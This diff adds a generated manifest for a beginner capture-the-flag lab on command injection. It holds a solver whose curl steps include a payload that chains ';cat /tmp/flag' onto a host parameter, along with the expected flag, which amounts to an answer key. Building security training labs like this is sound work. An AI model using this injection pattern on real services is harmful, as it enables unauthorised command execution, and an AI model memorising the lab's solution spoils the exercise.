@@ -1,0 +1,33 @@
+# Generated from platform/labs/Software Security/software-security-2-1-diagnostics-command-injection/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: software-security-2-1-diagnostics-command-injection
+track: Software Security
+difficulty: beginner
+source: platform/labs/Software Security/software-security-2-1-diagnostics-command-injection/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 8080
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/software-security-2-1-diagnostics-command-injection.sh
+  steps:
+  - name: Diagnostics page responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.diagnostics}:8080/
+    expect: '200'
+  - name: Normal lookup responds
+    command: curl -s -o /dev/null -w '%{http_code}' 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1'
+    expect: '200'
+  - name: Injected command returns the flag
+    command: curl -s 'http://{target.diagnostics}:8080/lookup?host=127.0.0.1%3Bcat%20/tmp/flag' | grep -o 'OCR{[^}]*}'
+    expect: OCR{sh3ll_1nj3ct10n_1s_4_bug}
+expected_flag_count: 1
+expected_flag: OCR{sh3ll_1nj3ct10n_1s_4_bug}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 384
+max_cpu: 0.45
